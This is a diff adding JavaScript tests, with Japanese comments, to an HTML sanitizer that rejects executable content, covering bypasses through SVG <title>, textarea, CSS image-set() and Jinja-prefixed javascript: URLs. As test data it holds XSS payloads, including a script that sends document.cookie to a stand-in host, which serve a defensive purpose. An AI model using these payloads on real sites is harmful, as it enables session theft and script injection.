@@ -213,3 +213,67 @@ describe('collectExecutableUnits / expandEncodedChips', () => {
     );
   });
 });
+
+// R-再レビュー: raw text 要素の読み飛ばしが単位抽出ごと消していた穴。
+// HTML の `<title>` が RCDATA なのは HTML 名前空間だけで、SVG の foreign content では
+// 普通の外来要素。つまり `<svg><title><script>…` は実行されるのに単位ゼロで通っていた。
+describe('raw text 読み飛ばしの迂回', () => {
+  const svgBase = '<div><svg><title>zu</title></svg></div>';
+
+  it('<svg><title> の内側に隐した script を拒否する', () => {
+    const evil =
+      '<div><svg><title><script>fetch("//x/"+document.cookie)</script></title></svg></div>';
+    expect(collectExecutableUnits(evil).length).toBeGreaterThan(0);
+    expect(accepted(svgBase, evil)).toBe(false);
+  });
+
+  it('<svg><title> の内側に隐した <style>@import を拒否する', () => {
+    const evil = '<div><svg><title><style>@import url(http://evil/x)</style></title></svg></div>';
+    expect(collectExecutableUnits(evil).length).toBeGreaterThan(0);
+    expect(accepted(svgBase, evil)).toBe(false);
+  });
+
+  it('textarea の内側も同じく走査する', () => {
+    const base = '<div><textarea>a</textarea></div>';
+    const evil = '<div><textarea><script>x()</script></textarea></div>';
+    expect(accepted(base, evil)).toBe(false);
+  });
+});
+
+// CSS の URL 検出は `url(` を探す形だと `image-set("http://…")` で破れる。
+// PDF 経路のゲート(`@editor/shared`)と同じ判定を共有していることを主張する。
+describe('CSS の外部参照検出の共有', () => {
+  const base = '<div><style>.a{color:red}</style></div>';
+
+  it('image-set() の引用符文字列に置いた絶対 URL を拒否する', () => {
+    const evil = '<div><style>.a{background-image:image-set("http://evil/x.png" 1x)}</style></div>';
+    expect(collectExecutableUnits(evil).length).toBeGreaterThan(0);
+    expect(accepted(base, evil)).toBe(false);
+  });
+
+  it('-webkit-image-set も同じく拒否する', () => {
+    const evil =
+      '<div><style>.a{background-image:-webkit-image-set("http://evil/x.png" 1x)}</style></div>';
+    expect(accepted(base, evil)).toBe(false);
+  });
+
+  it('ページ番号のマージンボックスは単位を作らない(正当な CSS を拒らない)', () => {
+    const css = '<div><style>@page{@bottom-center{content:counter(page)}}</style></div>';
+    expect(collectExecutableUnits(css)).toEqual([]);
+  });
+});
+
+// URL 属性の Jinja トークンで始まる値を無条件 inert にしていた穴。
+// テンプレは描画されてから使われるので、描画後の href は `javascript:alert(1)` になる。
+describe('Jinja トークンを前置した URL', () => {
+  it('href="{{\'\'}}javascript:…" を拒否する', () => {
+    const evil = `<a href="{{''}}javascript:alert(1)">x</a>`;
+    expect(collectExecutableUnits(evil).length).toBeGreaterThan(0);
+    expect(accepted('<a href="/x">x</a>', evil)).toBe(false);
+  });
+
+  it('値全体が Jinja の普通の URL は単位を作らない(誤検知しない)', () => {
+    expect(collectExecutableUnits('<a href="{{ fund.url }}">x</a>')).toEqual([]);
+    expect(collectExecutableUnits('<img src="{{ logo }}/a.png">')).toEqual([]);
+  });
+});
